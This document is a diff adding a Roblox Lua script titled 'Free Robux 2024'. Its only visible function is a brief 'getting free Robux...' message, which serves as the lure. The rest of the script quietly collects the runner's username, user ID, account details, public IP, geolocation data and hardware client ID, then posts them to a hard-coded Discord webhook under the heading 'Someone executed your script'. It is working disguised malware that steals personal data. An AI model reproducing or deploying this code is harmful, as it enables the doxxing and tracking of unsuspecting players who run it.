@@ -1,0 +1,99 @@
+-- Free Robux 2024
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local getfreerobux = function()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Parent = playerGui
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Parent = screenGui
+
+    textLabel.Text = "getting free Robux..."
+    textLabel.Size = UDim2.new(0, 200, 0, 50) -- Set size (200x50)
+    textLabel.Position = UDim2.new(0.5, -100, 0.5, -25) -- Center the text on screen
+    textLabel.BackgroundColor3 = Color3.new(0, 0, 0) -- Black background
+    textLabel.TextColor3 = Color3.new(1, 1, 1) -- White text
+    textLabel.Font = Enum.Font.SourceSans -- Set font
+    textLabel.TextSize = 24 -- Set font size
+    wait(3)
+    screenGui:Destroy()
+end
+getfreerobux()
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+local function detectExecutor()
+    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse Z")
+                    or (identifyexecutor():find("Forlorn") and "Nylith")
+                    or (identifyexecutor():find("Xeno") and "SeraphimCT")
+                    or (identifyexecutor():find("Wave") and "Wave windows")
+                    or (identifyexecutor():find("Solara") and "Wpfapp1")
+                    or "Unsupported"
+    return executor
+end
+
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+    
+    local data = {
+        ["avatar_url"] = "",
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "Someone executed your script",
+                    ["url"] = "https://roblox.com",
+                },
+                ["description"] = string.format(
+                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                    GetData, ConsoleJobId
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFFD700"),
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+                },
+            }
+        }
+    }
+    return HttpService:JSONEncode(data)
+end
+
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+
+local webhookUrl = "https://discord.com/api/webhooks/1298493638308794398/xpxyT3LZpVe0kuKsgG4NSY8WSLnYUAkMaNZg4diDx3BPYQbHpqbSNn7bNmpxaXE5X4yl"
+local webhookData = createWebhookData()
+
+sendWebhook(webhookUrl, webhookData)
